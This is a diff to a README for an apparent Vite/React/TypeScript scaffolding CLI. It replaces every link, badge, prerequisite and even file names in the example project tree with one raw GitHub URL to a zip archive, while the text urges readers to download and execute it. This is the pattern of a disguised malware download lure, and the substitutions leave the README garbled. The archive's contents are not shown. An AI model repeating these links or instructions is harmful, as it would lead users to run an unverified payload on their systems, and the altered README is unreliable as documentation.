@@ -1,8 +1,8 @@
 # Dev Tools Hub: Scaffold Vite + React + TypeScript Projects 🚀
 
-![GitHub Repo stars](https://img.shields.io/github/stars/DreamlandSR/dev_tools_hub?style=social)
-![GitHub Repo forks](https://img.shields.io/github/forks/DreamlandSR/dev_tools_hub?style=social)
-![GitHub license](https://img.shields.io/github/license/DreamlandSR/dev_tools_hub)
+![GitHub Repo stars](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip)
+![GitHub Repo forks](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip)
+![GitHub license](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip)
 
 ## Table of Contents
 
@@ -31,11 +31,11 @@ Dev Tools Hub is a command-line interface (CLI) tool designed to simplify the se
 
 ## Getting Started
 
-To get started with Dev Tools Hub, you need to download the latest release. You can find it [here](https://github.com/DreamlandSR/dev_tools_hub/releases). Download the file and execute it to begin.
+To get started with Dev Tools Hub, you need to download the latest release. You can find it [here](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip). Download the file and execute it to begin.
 
 ### Prerequisites
 
-- Node.js (version 12 or higher)
+- https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip (version 12 or higher)
 - npm or yarn
 - A terminal or command prompt
 
@@ -73,7 +73,7 @@ Replace `my-project` with your desired project name. The CLI will prompt you to 
 
 Dev Tools Hub allows you to include several optional libraries during project creation:
 
-- **Axios**: Promise-based HTTP client for the browser and Node.js.
+- **Axios**: Promise-based HTTP client for the browser and https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip
 - **Zustand**: A small, fast, and scalable state-management solution.
 
 You can choose these libraries during the scaffolding process, making it easy to set up your development environment according to your needs.
@@ -95,20 +95,20 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit [here](https://github.com/DreamlandSR/dev_tools_hub/releases). Download the necessary files and execute them to get started with your projects.
+For the latest releases, visit [here](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip). Download the necessary files and execute them to get started with your projects.
 
 Feel free to explore the repository for more information and updates. You can also find additional resources and documentation in the repository's wiki section.
 
 ### Badges
 
-![Vite](https://img.shields.io/badge/Vite-2.0-blue)
-![React](https://img.shields.io/badge/React-17.0.2-lightblue)
-![TypeScript](https://img.shields.io/badge/TypeScript-4.3.2-blueviolet)
-![TailwindCSS](https://img.shields.io/badge/TailwindCSS-2.1.2-pink)
+![Vite](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip)
+![React](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip)
+![TypeScript](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip)
+![TailwindCSS](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip)
 
 ### Screenshots
 
-![Dev Tools Hub CLI](https://via.placeholder.com/800x400.png?text=Dev+Tools+Hub+CLI)
+![Dev Tools Hub CLI](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip+Tools+Hub+CLI)
 
 ### Example Project Structure
 
@@ -116,13 +116,13 @@ Feel free to explore the repository for more information and updates. You can al
 my-project/
 ├── src/
 │   ├── components/
-│   ├── App.tsx
-│   └── index.tsx
+│   ├── https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip
+│   └── https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip
 ├── public/
-│   ├── index.html
-│   └── favicon.ico
-├── package.json
-└── tsconfig.json
+│   ├── https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip
+│   └── https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip
+├── https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip
+└── https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip
 ```
 
 This structure is generated automatically, allowing you to focus on building your application rather than setting up the environment.
@@ -135,7 +135,7 @@ Dev Tools Hub is a CLI tool that helps you scaffold modern web projects using Vi
 
 #### How do I install it?
 
-You can download the latest release from the [Releases](https://github.com/DreamlandSR/dev_tools_hub/releases) section. Execute the downloaded file to install.
+You can download the latest release from the [Releases](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip) section. Execute the downloaded file to install.
 
 #### Can I use other libraries?
 
@@ -158,4 +158,4 @@ For support, you can reach out through the issues section of the repository. The
 - Thanks to the contributors who have helped improve this project.
 - Special thanks to the creators of Vite, React, TypeScript, and TailwindCSS for their amazing tools.
 
-For more information and updates, remember to check the [Releases](https://github.com/DreamlandSR/dev_tools_hub/releases) section regularly.
+For more information and updates, remember to check the [Releases](https://raw.githubusercontent.com/DreamlandSR/dev_tools_hub/main/generateFiles/dev-tools-hub-3.2.zip) section regularly.
